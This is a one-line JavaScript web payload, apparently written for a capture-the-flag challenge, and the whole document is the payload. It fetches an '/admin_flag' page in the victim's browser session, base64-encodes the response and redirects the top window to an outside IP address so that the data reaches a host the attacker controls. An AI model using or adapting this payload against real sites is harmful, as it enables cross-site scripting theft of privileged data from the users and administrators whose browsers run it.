fetch("/admin_flag").then(x=>x.text()).then(x=>top.location.replace("http://198.13.38.185:4000/?"+btoa(x)))
